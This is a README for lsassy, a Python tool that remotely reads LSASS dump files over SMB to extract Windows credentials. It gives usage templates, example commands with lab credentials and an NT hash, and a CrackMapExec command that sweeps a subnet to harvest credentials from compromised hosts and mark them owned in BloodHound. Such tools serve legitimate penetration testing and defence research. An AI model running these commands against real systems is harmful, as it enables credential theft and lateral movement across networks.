# lsassy

[![PyPI version](https://d25lcipzij17d.cloudfront.net/badge.svg?id=py&type=6&v=0.2.5&x2=0)](https://pypi.org/project/lsassy/)

![CME Module example](/assets/cme_lsassy.gif)

Python library to remotely parse lsass dump and extract credentials.
This library uses [impacket](https://github.com/SecureAuthCorp/impacket) projects to remotely read necessary bytes in lsass dump and [pypykatz](https://github.com/skelsec/pypykatz) to extract credentials.

| Chapters                                     | Description                                             |
|----------------------------------------------|---------------------------------------------------------|
| [Requirements](#requirements)                | Requirements to install lsassy from source              |
| [Basic Usage](#basic-usage)                  | Command line template for standalone version            |
| [CrackMapExec Module](#crackmapexec-module)  | Link to CrackMapExec module included in this repository |
| [Examples](#examples)                        | Command line examples for standalone and CME module     |
| [Installation](#installation)                | Installation commands from pip or from source           |
| [Issues](#issues)                            | Read this before creating an issue                      |
| [Acknowledgments](#acknowledgments)          | Kudos to these people and tools                         |

## Requirements

* Python >= 3.6
* [pypykatz](https://github.com/skelsec/pypykatz) >= 0.3.0
* [impacket](https://github.com/SecureAuthCorp/impacket)

## Basic Usage

```
lsassy [--hashes [LM:]NT] [<domain>/]<user>[:<password>]@<target>:/share_name/path/to/lsass.dmp
```

## CrackMapExec module

I wrote a CrackMapExec module that uses **lsassy** to extract credentials on compromised hosts

CrackMapExec module is in `cme` folder : [CME Module](/cme/)

## Examples

### lsassy

```
lsassy ADSEC.LOCAL/jsnow:Winter_is_coming_\!@dc01.adsec.local:/C$/Windows/Temp/lsass.dmp

lsassy --hashes 952c28bd2fd728898411b301475009b7 Administrateur@desktop01.adsec.local:/ADMIN$/lsass.dmp
```

### CME Module

```
crackmapexec smb 10.0.0.0/24 -d adsec.local -u Administrator -p Passw0rd -M lsassy -o BLOODHOUND=True NEO4JPASS=bloodhound```
```

## Installation

### From pip

```
python3.7 -m pip install lsassy
```

### From sources

```
python3.7 setup.py install
```

### ChangeLog

```
v0.2.0
------
* Add BloodHound option to CME module (-o BLOODHOUND=True)
    - Set compromised targets as "owned" in BloodHound
    - Check if compromised users have at least one path to domain admin
* Custom parsing (json, grep, pretty [default])
* New --hashes option to lsassy
* Include CME module in repository
* Add credentials to CME database


v0.1.0
------
First release
```

## Issues

If you find an issue with this tool (that's very plausible !), please

* Check that you're using the latest version
* Send as much details as possible.
    - For standalone **lsassy**, please use the `-d` debug flag
    - For CME module, please use CrackMapExec `--verbose` flag

## Acknowledgments

* [Impacket](https://github.com/SecureAuthCorp/impacket)
* [SkelSec](http://twitter.com/skelsec) for Pypykatz, but also for his patience and help
* [mpgn](https://twitter.com/mpgn_x64) for his help and ideas
